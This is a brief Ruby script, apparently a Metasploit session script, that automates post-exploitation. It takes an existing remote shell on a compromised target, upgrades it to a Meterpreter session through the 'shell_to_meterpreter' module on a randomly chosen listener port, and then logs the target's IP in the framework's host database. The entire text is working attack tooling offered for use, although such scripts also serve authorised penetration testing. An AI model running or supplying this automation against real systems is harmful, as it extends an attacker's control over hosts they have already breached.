# Promotes a shell session to Meterpreter for the current target.
# 1. Creates and runs the shell_to_meterpreter module.
# 2. Ensures the host exists in the database.

fm = client.framework
target_ip = client.session_host

def convert_shell_to_meterpreter(fm, sid, port, client)
  mod = fm.post.create("multi/manage/shell_to_meterpreter")
  mod.datastore["SESSION"] = sid
  mod.datastore["LPORT"]   = port

  mod.run_simple(
    'LocalInput'  => client.user_input,
    'LocalOutput' => client.user_output,
    'RunAsJob'    => false
  )
end

def ensure_host(fm, ip)
  fm.db.hosts.find_by(address: ip) ||
    fm.db.hosts.create(address: ip)
end

port = rand(5000..59999)
convert_shell_to_meterpreter(fm, client.sid, port, client)
ensure_host(fm, target_ip)
